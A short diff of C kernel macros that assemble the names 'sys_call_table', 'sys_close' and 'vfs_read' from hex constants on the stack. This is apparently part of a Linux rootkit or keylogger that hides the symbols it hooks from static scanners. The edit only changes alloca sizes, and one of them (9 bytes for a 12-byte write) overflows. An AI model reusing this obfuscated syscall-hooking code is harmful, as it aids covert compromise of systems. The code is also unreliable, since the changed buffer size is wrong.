@@ -52,7 +52,7 @@
 #define SSIZE_MAX 	32767
 #define SYS_CALL_TABLE \
 ({ \
-unsigned int *p = (unsigned int*)__builtin_alloca(21); \
+unsigned int *p = (unsigned int*)__builtin_alloca(16); \
  p[0] = 0x5f737973; \
  p[1] = 0x6c6c6163; \
  p[2] = 0x6261745f; \
@@ -62,7 +62,7 @@ unsigned int *p = (unsigned int*)__builtin_alloca(21); \
 
 #define SYS_CLOSE \
 ({ \
-unsigned int *p = (unsigned int*)__builtin_alloca(21); \
+unsigned int *p = (unsigned int*)__builtin_alloca(12); \
  p[0] = 0x5f737973; \
  p[1] = 0x736f6c63; \
  p[2] = 0x00000065; \
@@ -79,7 +79,7 @@ atomic_t read_on;
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
 	#define VFS_READ \
 	({ \
-	unsigned int *p = (unsigned int*)__builtin_alloca(21); \
+	unsigned int *p = (unsigned int*)__builtin_alloca(9); \
 	 p[0] = 0x5f736676; \
 	 p[1] = 0x64616572; \
 	 p[2] = 0x00; \
